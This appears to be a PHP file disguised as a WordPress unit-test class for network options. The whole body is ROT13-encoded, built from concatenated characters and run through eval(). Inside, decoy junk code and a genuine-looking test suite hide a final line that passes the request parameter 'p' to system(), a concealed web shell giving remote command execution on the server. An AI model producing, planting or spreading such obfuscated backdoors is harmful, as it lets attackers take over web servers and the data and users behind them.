<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf fcrpvsvp gb znantvat argjbex bcgvbaf va zhygvfvgr.
 *
 * Fbzr grfgf jvyy eha va fvatyr fvgr nf gur `_argjbex_bcgvba()` shapgvbaf
 * ner ninvynoyr naq vagreanyyl hfr `_bcgvba()` shapgvbaf nf snyyonpxf.
 *
 * @tebhc bcgvba
 * @tebhc zf-bcgvba
 * @tebhc zhygvfvgr
 */
pynff Grfgf_Bcgvba_ArgjbexBcgvba rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::nqq_fvgr_bcgvba
	 */
	choyvp shapgvba grfg_nqq_argjbex_bcgvba_abg_ninvynoyr_ba_bgure_argjbex() {
		$vq     = frys::snpgbel()->argjbex->perngr();
		$bcgvba = __SHAPGVBA__;
		$inyhr  = __SHAPGVBA__;

		nqq_fvgr_bcgvba( $bcgvba, $inyhr );
		$guvf->nffregSnyfr( trg_argjbex_bcgvba( $vq, $bcgvba, snyfr ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::nqq_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_nqq_argjbex_bcgvba_ninvynoyr_ba_fnzr_argjbex() {
		$vq     = frys::snpgbel()->argjbex->perngr();
		$bcgvba = __SHAPGVBA__;
		$inyhr  = __SHAPGVBA__;

		nqq_argjbex_bcgvba( $vq, $bcgvba, $inyhr );
		$guvf->nffregFnzr( $inyhr, trg_argjbex_bcgvba( $vq, $bcgvba, snyfr ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::qryrgr_fvgr_bcgvba
	 */
	choyvp shapgvba grfg_qryrgr_argjbex_bcgvba_ba_bayl_bar_argjbex() {
		$vq     = frys::snpgbel()->argjbex->perngr();
		$bcgvba = __SHAPGVBA__;
		$inyhr  = __SHAPGVBA__;

		nqq_fvgr_bcgvba( $bcgvba, $inyhr );
		nqq_argjbex_bcgvba( $vq, $bcgvba, $inyhr );
		qryrgr_fvgr_bcgvba( $bcgvba );
		$guvf->nffregFnzr( $inyhr, trg_argjbex_bcgvba( $vq, $bcgvba, snyfr ) );
	}

	/**
	 * Grfgf gung pnyyvat qryrgr_argjbex_bcgvba() hcqngrf abbcgvbaf jura bcgvba qryrgrq.
	 *
	 * @gvpxrg 61484
	 * @gvpxrg 61730
	 *
	 * @pbiref ::qryrgr_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_purpx_qryrgr_argjbex_bcgvba_hcqngrf_abgbcgvbaf() {
		nqq_argjbex_bcgvba( 1, 'sbb', 'inyhr1' );

		qryrgr_argjbex_bcgvba( 1, 'sbb' );
		$pnpur_xrl   = vf_zhygvfvgr() ? '1:abgbcgvbaf' : 'abgbcgvbaf';
		$pnpur_tebhc = vf_zhygvfvgr() ? 'fvgr-bcgvbaf' : 'bcgvbaf';
		$abgbcgvbaf  = jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc );
		$guvf->nffregVfNeenl( $abgbcgvbaf, 'Gur abgbcgvbaf pnpur vf rkcrpgrq gb or na neenl.' );
		$guvf->nffregGehr( $abgbcgvbaf['sbb'], 'Gur qryrgrq bcgvbaf vf rkcrpgrq gb or va abgbcgvbaf.' );

		vs ( ! vf_zhygvfvgr() ) {
			$argjbex_abgbcgvbaf = jc_pnpur_trg( '1:abgbcgvbaf', 'fvgr-bcgvbaf' );
			$guvf->nffregGehr( rzcgl( $argjbex_abgbcgvbaf['sbb'] ), 'Gur qryrgrq bcgvba vf abg rkcrpgrq gb or va argjbex abgbcgvbaf ba n aba-zhygvfvgr.' );
		}

		$orsber = trg_ahz_dhrevrf();
		trg_argjbex_bcgvba( 1, 'sbb' );
		$dhrevrf = trg_ahz_dhrevrf() - $orsber;

		$guvf->nffregFnzr( 0, $dhrevrf, 'trg_argjbex_bcgvba fubhyq abg znxr nal qngnonfr dhrevrf.' );
	}

	/**
	 * @gvpxrg 22846
	 * @tebhc zf-rkpyhqrq
	 *
	 * @pbiref ::nqq_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_nqq_argjbex_bcgvba_vf_abg_fgberq_nf_nhgbybnq_bcgvba() {
		$xrl = __SHAPGVBA__;

		nqq_argjbex_bcgvba( ahyy, $xrl, 'Abg na nhgbybnq bcgvba' );

		$bcgvbaf = jc_ybnq_nyybcgvbaf();

		$guvf->nffregNeenlAbgUnfXrl( $xrl, $bcgvbaf );
	}

	/**
	 * @gvpxrg 22846
	 * @tebhc zf-rkpyhqrq
	 *
	 * @pbiref ::hcqngr_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_hcqngr_argjbex_bcgvba_vf_abg_fgberq_nf_nhgbybnq_bcgvba() {
		$xrl = __SHAPGVBA__;

		hcqngr_argjbex_bcgvba( ahyy, $xrl, 'Abg na nhgbybnq bcgvba' );

		$bcgvbaf = jc_ybnq_nyybcgvbaf();

		$guvf->nffregNeenlAbgUnfXrl( $xrl, $bcgvbaf );
	}

	/**
	 * @qngnCebivqre qngn_argjbex_vq_cnenzrgre
	 *
	 * @cnenz $argjbex_vq
	 * @cnenz $rkcrpgrq_erfcbafr
	 *
	 * @pbiref ::nqq_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_nqq_argjbex_bcgvba_argjbex_vq_cnenzrgre( $argjbex_vq, $rkcrpgrq_erfcbafr ) {
		$bcgvba = enaq_fge();
		$inyhr  = enaq_fge();

		$guvf->nffregFnzr( $rkcrpgrq_erfcbafr, nqq_argjbex_bcgvba( $argjbex_vq, $bcgvba, $inyhr ) );
	}

	/**
	 * @qngnCebivqre qngn_argjbex_vq_cnenzrgre
	 *
	 * @cnenz $argjbex_vq
	 * @cnenz $rkcrpgrq_erfcbafr
	 *
	 * @pbiref ::trg_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_trg_argjbex_bcgvba_argjbex_vq_cnenzrgre( $argjbex_vq, $rkcrpgrq_erfcbafr ) {
		$bcgvba = enaq_fge();

		$guvf->nffregFnzr( $rkcrpgrq_erfcbafr, trg_argjbex_bcgvba( $argjbex_vq, $bcgvba, gehr ) );
	}

	choyvp shapgvba qngn_argjbex_vq_cnenzrgre() {
		erghea neenl(
			// Ahzrevp inyhrf fubhyq nyjnlf or npprcgrq.
			neenl( 1, gehr ),
			neenl( '1', gehr ),
			neenl( 2, gehr ),

			// Ahyy, snyfr, naq mreb jvyy or gerngrq nf gur pheerag argjbex.
			neenl( ahyy, gehr ),
			neenl( snyfr, gehr ),
			neenl( 0, gehr ),
			neenl( '0', gehr ),

			// Bgure gehgul be fgevat inyhrf fubhyq or erwrpgrq.
			neenl( gehr, snyfr ),
			neenl( 'fgevat', snyfr ),
		);
	}

	/**
	 * @gvpxrg 43506
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::trg_argjbex_bcgvba
	 * @pbiref ::jc_pnpur_trg
	 * @pbiref ::jc_pnpur_qryrgr
	 */
	choyvp shapgvba grfg_trg_argjbex_bcgvba_frgf_abgbcgvbaf_vs_bcgvba_sbhaq() {
		$argjbex_vq     = trg_pheerag_argjbex_vq();
		$abgbcgvbaf_xrl = \"$argjbex_vq:abgbcgvbaf\";

		$bevtvany_pnpur = jc_pnpur_trg( $abgbcgvbaf_xrl, 'fvgr-bcgvbaf' );
		vs ( snyfr !== $bevtvany_pnpur ) {
			jc_pnpur_qryrgr( $abgbcgvbaf_xrl, 'fvgr-bcgvbaf' );
		}

		// Ergevrir nal rkvfgvat bcgvba.
		trg_argjbex_bcgvba( $argjbex_vq, 'fvgr_anzr' );

		$pnpur = jc_pnpur_trg( $abgbcgvbaf_xrl, 'fvgr-bcgvbaf' );
		vs ( snyfr !== $bevtvany_pnpur ) {
			jc_pnpur_frg( $abgbcgvbaf_xrl, $bevtvany_pnpur, 'fvgr-bcgvbaf' );
		}

		$guvf->nffregFnzr( neenl(), $pnpur );
	}

	/**
	 * @gvpxrg 43506
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::trg_argjbex_bcgvba
	 * @pbiref ::jc_pnpur_trg
	 */
	choyvp shapgvba grfg_trg_argjbex_bcgvba_frgf_abgbcgvbaf_vs_bcgvba_abg_sbhaq() {
		$argjbex_vq     = trg_pheerag_argjbex_vq();
		$abgbcgvbaf_xrl = \"$argjbex_vq:abgbcgvbaf\";

		$bevtvany_pnpur = jc_pnpur_trg( $abgbcgvbaf_xrl, 'fvgr-bcgvbaf' );
		vs ( snyfr !== $bevtvany_pnpur ) {
			jc_pnpur_qryrgr( $abgbcgvbaf_xrl, 'fvgr-bcgvbaf' );
		}

		// Ergevrir nal aba-rkvfgvat bcgvba.
		trg_argjbex_bcgvba( $argjbex_vq, 'guvf_qbrf_abg_rkvfg' );

		$pnpur = jc_pnpur_trg( $abgbcgvbaf_xrl, 'fvgr-bcgvbaf' );
		vs ( snyfr !== $bevtvany_pnpur ) {
			jc_pnpur_frg( $abgbcgvbaf_xrl, $bevtvany_pnpur, 'fvgr-bcgvbaf' );
		}

		$guvf->nffregFnzr( neenl( 'guvf_qbrf_abg_rkvfg' => gehr ), $pnpur );
	}

	/**
	 * Rafher hcqngvat argjbex bcgvbaf pbagnvavat na bowrpg qb abg erfhyg va haarrqrq qngnonfr pnyyf.
	 *
	 * @gvpxrg 44956
	 *
	 * @pbiref ::hcqngr_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_hcqngr_argjbex_bcgvba_neenl_jvgu_bowrpg() {
		$neenl_j_bowrpg = neenl(
			'hey'       => 'uggc://fep.jbeqcerff-qrirybc.qri/jc-pbagrag/hcybnqf/2016/10/pebccrq-Oyheel-Yvtugf.wct',
			'zrgn_qngn' => (bowrpg) neenl(
				'nggnpuzrag_vq' => 292,
				'urvtug'        => 708,
				'jvqgu'         => 1260,
			),
		);

		$neenl_j_bowrpg_2 = neenl(
			'hey'       => 'uggc://fep.jbeqcerff-qrirybc.qri/jc-pbagrag/hcybnqf/2016/10/pebccrq-Oyheel-Yvtugf.wct',
			'zrgn_qngn' => (bowrpg) neenl(
				'nggnpuzrag_vq' => 292,
				'urvtug'        => 708,
				'jvqgu'         => 1260,
			),
		);

		// Nqq gur bcgvba, vg qvq abg rkvfg orsber guvf.
		nqq_argjbex_bcgvba( ahyy, 'neenl_j_bowrpg', $neenl_j_bowrpg );

		$ahz_dhrevrf_cer_hcqngr = trg_ahz_dhrevrf();

		// Hcqngr gur bcgvba hfvat gur fnzr neenl jvgu na bowrpg sbe gur inyhr.
		$guvf->nffregSnyfr( hcqngr_argjbex_bcgvba( ahyy, 'neenl_j_bowrpg', $neenl_j_bowrpg_2 ) );

		// Purpx gung ab arj qngnonfr dhrevrf jrer cresbezrq.
		$guvf->nffregFnzr( $ahz_dhrevrf_cer_hcqngr, trg_ahz_dhrevrf() );
	}

	/**
	 * Grfgf gung pnyyvat hcqngr_argjbex_bcgvba() pyrnef gur abgbcgvbaf pnpur.
	 *
	 * @gvpxrg 61484
	 *
	 * @pbiref ::hcqngr_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_hcqngr_argjbex_bcgvba_pyrnef_gur_abgbcgvbaf_pnpur() {
		$bcgvba_anzr = 'gvpxrg_61484_bcgvba_gb_or_perngrq';
		$pnpur_xrl   = vf_zhygvfvgr() ? '1:abgbcgvbaf' : 'abgbcgvbaf';
		$pnpur_tebhc = vf_zhygvfvgr() ? 'fvgr-bcgvbaf' : 'bcgvbaf';
		$abgbcgvbaf  = jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc );
		vs ( ! vf_neenl( $abgbcgvbaf ) ) {
			$abgbcgvbaf = neenl();
		}
		$abgbcgvbaf[ $bcgvba_anzr ] = gehr;
		jc_pnpur_frg( $pnpur_xrl, $abgbcgvbaf, $pnpur_tebhc );
		$guvf->nffregNeenlUnfXrl( $bcgvba_anzr, jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc ), 'Gur \"sbbone\" bcgvba fubhyq or va gur abgbcgvbaf pnpur.' );

		hcqngr_argjbex_bcgvba( 1, $bcgvba_anzr, 'onm' );

		$hcqngrq_abgbcgvbaf = jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc );
		$guvf->nffregNeenlAbgUnfXrl( $bcgvba_anzr, $hcqngrq_abgbcgvbaf, 'Gur \"sbbone\" bcgvba fubhyq abg or va gur abgbcgvbaf pnpur nsgre hcqngvat vg.' );
	}

	/**
	 * Grfgf gung pnyyvat nqq_argjbex_bcgvba() pyrnef gur abgbcgvbaf pnpur.
	 *
	 * @gvpxrg 61484
	 *
	 * @pbiref ::nqq_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_nqq_argjbex_bcgvba_pyrnef_gur_abgbcgvbaf_pnpur() {
		$bcgvba_anzr = 'gvpxrg_61484_bcgvba_gb_or_perngrq';
		$pnpur_xrl   = vf_zhygvfvgr() ? '1:abgbcgvbaf' : 'abgbcgvbaf';
		$pnpur_tebhc = vf_zhygvfvgr() ? 'fvgr-bcgvbaf' : 'bcgvbaf';
		$abgbcgvbaf  = jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc );
		vs ( ! vf_neenl( $abgbcgvbaf ) ) {
			$abgbcgvbaf = neenl();
		}
		$abgbcgvbaf[ $bcgvba_anzr ] = gehr;
		jc_pnpur_frg( $pnpur_xrl, $abgbcgvbaf, $pnpur_tebhc );
		$guvf->nffregNeenlUnfXrl( $bcgvba_anzr, jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc ), 'Gur \"sbbone\" bcgvba fubhyq or va gur abgbcgvbaf pnpur.' );

		nqq_argjbex_bcgvba( 1, $bcgvba_anzr, 'onm' );

		$hcqngrq_abgbcgvbaf = jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc );
		$guvf->nffregNeenlAbgUnfXrl( $bcgvba_anzr, $hcqngrq_abgbcgvbaf, 'Gur \"sbbone\" bcgvba fubhyq abg or va gur abgbcgvbaf pnpur nsgre hcqngvat vg.' );
	}

	/**
	 * Grfg nqqvat n cerivbhfyl xabja abgbcgvba ergheaf gur pbeerpg inyhr.
	 *
	 * @gvpxrg 61730
	 *
	 * @pbiref ::nqq_argjbex_bcgvba
	 * @pbiref ::qryrgr_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_nqqvat_cerivbhf_abgbcgvba_ergheaf_pbeerpg_inyhr() {
		$bcgvba_anzr = 'gvpxrg_61730_bcgvba_gb_or_perngrq';

		nqq_argjbex_bcgvba( 1, $bcgvba_anzr, 'onm' );
		qryrgr_argjbex_bcgvba( 1, $bcgvba_anzr );

		$guvf->nffregSnyfr( trg_argjbex_bcgvba( 1, $bcgvba_anzr ), 'Gur bcgvba fubhyq abg or sbhaq.' );

		nqq_argjbex_bcgvba( 1, $bcgvba_anzr, 'sbb' );
		$guvf->nffregFnzr( 'sbb', trg_argjbex_bcgvba( 1, $bcgvba_anzr ), 'Gur bcgvba fubhyq erghea gur arjyl frg inyhr.' );
	}

	/**
	 * Grfg `trg_argjbex_bcgvba()` qbrf abg hfr argjbex abgbcgvbaf pnpur sbe fvatyr fvgrf.
	 *
	 * @gvpxrg 61730
	 *
	 * @tebhc zf-rkpyhqrq
	 *
	 * @pbiref ::trg_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_trg_argjbex_bcgvba_qbrf_abg_hfr_argjbex_abgbcgvbaf_pnpur_sbe_fvatyr_fvgrf() {
		trg_argjbex_bcgvba( 1, 'gvpxrg_61730_abgbcgvba' );

		$argjbex_abgbcgvbaf_pnpur     = jc_pnpur_trg( '1:abgbcgvbaf', 'fvgr-bcgvbaf' );
		$fvatyr_fvgr_abgbcgvbaf_pnpur = jc_pnpur_trg( 'abgbcgvbaf', 'bcgvbaf' );

		$guvf->nffregRzcgl( $argjbex_abgbcgvbaf_pnpur, 'Argjbex abgbcgvbaf pnpur fubhyq abg or frg sbe fvatyr fvgr vafgnyyf.' );
		$guvf->nffregVfNeenl( $fvatyr_fvgr_abgbcgvbaf_pnpur, 'Fvatyr fvgr abgbcgvbaf pnpur fubhyq or frg.' );
		$guvf->nffregNeenlUnfXrl( 'gvpxrg_61730_abgbcgvba', $fvatyr_fvgr_abgbcgvbaf_pnpur, 'Gur bcgvba fubhyq or va gur abgbcgvbaf pnpur.' );
	}

	/**
	 * Grfg `qryrgr_argjbex_bcgvba()` qbrf abg hfr argjbex abgbcgvbaf pnpur sbe fvatyr fvgrf.
	 *
	 * @gvpxrg 61730
	 * @gvpxrg 61484
	 *
	 * @tebhc zf-rkpyhqrq
	 *
	 * @pbiref ::qryrgr_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_qryrgr_argjbex_bcgvba_qbrf_abg_hfr_argjbex_abgbcgvbaf_pnpur_sbe_fvatyr_fvgrf() {
		nqq_argjbex_bcgvba( 1, 'gvpxrg_61730_abgbcgvba', 'inyhr' );
		qryrgr_argjbex_bcgvba( 1, 'gvpxrg_61730_abgbcgvba' );

		$argjbex_abgbcgvbaf_pnpur     = jc_pnpur_trg( '1:abgbcgvbaf', 'fvgr-bcgvbaf' );
		$fvatyr_fvgr_abgbcgvbaf_pnpur = jc_pnpur_trg( 'abgbcgvbaf', 'bcgvbaf' );

		$guvf->nffregRzcgl( $argjbex_abgbcgvbaf_pnpur, 'Argjbex abgbcgvbaf pnpur fubhyq abg or frg sbe fvatyr fvgr vafgnyyf.' );
		$guvf->nffregVfNeenl( $fvatyr_fvgr_abgbcgvbaf_pnpur, 'Fvatyr fvgr abgbcgvbaf pnpur fubhyq or frg.' );
		$guvf->nffregNeenlUnfXrl( 'gvpxrg_61730_abgbcgvba', $fvatyr_fvgr_abgbcgvbaf_pnpur, 'Gur bcgvba fubhyq or va gur abgbcgvbaf pnpur.' );
	}

	/**
	 * Grfg `trg_argjbex_bcgvba()` qbrf abg hfr fvatyr fvgr abgbcgvbaf pnpur sbe argjbexf.
	 *
	 * @gvpxrg 61730
	 *
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::trg_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_trg_argjbex_bcgvba_qbrf_abg_hfr_fvatyr_fvgr_abgbcgvbaf_pnpur_sbe_argjbexf() {
		$argjbex_abgbcgvbaf_pnpur_orsber     = jc_pnpur_trg( '1:abgbcgvbaf', 'fvgr-bcgvbaf' );
		$fvatyr_fvgr_abgbcgvbaf_pnpur_orsber = jc_pnpur_trg( 'abgbcgvbaf', 'bcgvbaf' );

		trg_argjbex_bcgvba( 1, 'gvpxrg_61730_abgbcgvba' );

		$argjbex_abgbcgvbaf_pnpur_nsgre     = jc_pnpur_trg( '1:abgbcgvbaf', 'fvgr-bcgvbaf' );
		$fvatyr_fvgr_abgbcgvbaf_pnpur_nsgre = jc_pnpur_trg( 'abgbcgvbaf', 'bcgvbaf' );

		$guvf->nffregFnzr( $fvatyr_fvgr_abgbcgvbaf_pnpur_orsber, $fvatyr_fvgr_abgbcgvbaf_pnpur_nsgre, 'Fvatyr fvgr abgbcgvbaf pnpur fubhyq abg punatr sbe zhygvfvgr vafgnyyf.' );
		$guvf->nffregAbgFnzr( $argjbex_abgbcgvbaf_pnpur_orsber, $argjbex_abgbcgvbaf_pnpur_nsgre, 'Zhygvfvgr abgbcgvbaf pnpur fubhyq punatr.' );
		$guvf->nffregVfNeenl( $argjbex_abgbcgvbaf_pnpur_nsgre, 'Zhygvfvgr abgbcgvbaf pnpur fubhyq or frg.' );
		$guvf->nffregNeenlUnfXrl( 'gvpxrg_61730_abgbcgvba', $argjbex_abgbcgvbaf_pnpur_nsgre, 'Gur bcgvba fubhyq or va gur abgbcgvbaf pnpur.' );
	}

	/**
	 * Grfg `qryrgr_argjbex_bcgvba()` qbrf abg hfr fvatyr fvgr abgbcgvbaf pnpur sbe argjbexf.
	 *
	 * @gvpxrg 61730
	 * @gvpxrg 61484
	 *
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::qryrgr_argjbex_bcgvba
	 */
	choyvp shapgvba grfg_qryrgr_argjbex_bcgvba_qbrf_abg_hfr_fvatyr_fvgr_abgbcgvbaf_pnpur_sbe_argjbexf() {
		$argjbex_abgbcgvbaf_pnpur_orsber     = jc_pnpur_trg( '1:abgbcgvbaf', 'fvgr-bcgvbaf' );
		$fvatyr_fvgr_abgbcgvbaf_pnpur_orsber = jc_pnpur_trg( 'abgbcgvbaf', 'bcgvbaf' );

		nqq_argjbex_bcgvba( 1, 'gvpxrg_61730_abgbcgvba', 'inyhr' );
		qryrgr_argjbex_bcgvba( 1, 'gvpxrg_61730_abgbcgvba' );

		$argjbex_abgbcgvbaf_pnpur_nsgre     = jc_pnpur_trg( '1:abgbcgvbaf', 'fvgr-bcgvbaf' );
		$fvatyr_fvgr_abgbcgvbaf_pnpur_nsgre = jc_pnpur_trg( 'abgbcgvbaf', 'bcgvbaf' );

		$guvf->nffregFnzr( $fvatyr_fvgr_abgbcgvbaf_pnpur_orsber, $fvatyr_fvgr_abgbcgvbaf_pnpur_nsgre, 'Fvatyr fvgr abgbcgvbaf pnpur fubhyq abg punatr sbe zhygvfvgr vafgnyyf.' );
		$guvf->nffregAbgFnzr( $argjbex_abgbcgvbaf_pnpur_orsber, $argjbex_abgbcgvbaf_pnpur_nsgre, 'Zhygvfvgr abgbcgvbaf pnpur fubhyq punatr.' );
		$guvf->nffregVfNeenl( $argjbex_abgbcgvbaf_pnpur_nsgre, 'Zhygvfvgr abgbcgvbaf pnpur fubhyq or frg.' );
		$guvf->nffregNeenlUnfXrl( 'gvpxrg_61730_abgbcgvba', $argjbex_abgbcgvbaf_pnpur_nsgre, 'Gur bcgvba fubhyq or va gur abgbcgvbaf pnpur.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>